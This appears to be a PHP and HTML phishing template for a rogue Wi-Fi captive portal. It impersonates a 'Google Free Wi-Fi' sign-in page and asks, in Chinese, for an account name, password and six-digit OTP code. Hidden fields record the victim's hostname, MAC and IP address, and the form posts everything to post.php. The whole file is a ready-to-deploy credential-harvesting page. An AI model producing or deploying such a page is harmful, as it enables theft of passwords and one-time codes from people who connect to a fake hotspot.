<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=394, user-scalable=no">
<title>Sign In - Google Free Wi-Fi</title>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />
<link rel="stylesheet" type="text/css" href="assets/css/styles.css">
<link rel="icon" type="image/png" href="assets/img/ico.png"/>

<script src="jquery-2.2.1.min.js"></script>
<script type="text/javascript">

</script>

</head>
<body>
<form method="POST" action="post.php">
    <img style="display:block;margin:0 auto" src="data:image/png;base64,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">

	<input id="user" type="text" name="username" placeholder="请输入账号名"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
	<input type="password" name="password" placeholder="请输入密码" autocorrect="off" autocomplete="off" autocapitalize="off" required>
	<input type="text" name="otp" placeholder="请输入六位OTP动态密码" autocorrect="off" autocomplete="off" autocapitalize="off" required>
	<input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
	<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
	<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
	<p class="warning"><?php echo !empty($err)?$err:"&nbsp;";?></p>
	<p><a href="">More options</a><span class="text-right"><button type="submit">登录</button></span></p>
</form>
<footer>
	简体中文 (CH_ZN)<img src="assets/img/mq40xx0kce.gif" alt="">
	<span class="text-right">Help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terms</span>
</footer>
<script>document.onload = function() { document.getElementById("user").focus();};</script>
</body>
</html>
